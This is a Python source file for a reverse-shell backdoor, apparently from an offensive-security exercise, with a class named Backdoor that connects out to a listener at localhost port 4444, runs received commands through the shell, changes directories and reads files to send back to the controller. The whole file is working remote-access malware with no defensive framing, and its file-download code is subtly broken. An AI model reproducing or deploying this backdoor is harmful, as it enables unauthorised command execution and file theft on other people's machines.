import socket, json
import subprocess
import os


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(bytes(json_data, "utf-8"))

    def reliable_recive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True).decode("utf-8")
        except:
            pass

    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to " + path
        except:
            return f"[-] No such file or directory: '{path}'"
        
    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return bytes(file.read(), "utf-8")
        except:
            self.reliable_send(f"[-] No such file or directory: '{path}'")

    def run(self):
        while True:
            command = str(self.reliable_recive())
            if command.split()[0] == "exit":
                self.connection.close()
                exit()
            elif command.split()[0] == "cd" and len(command) >= 2:
                command_result = self.change_working_directory_to(command.split()[1])
            elif command.split()[0] == "download":
                command_result = self.read_file(command.split()[1])
            else:
                command_result = self.execute_system_command(command)          
            
            self.reliable_send(command_result)


my_backdoor = Backdoor("localhost", 4444)
my_backdoor.run()





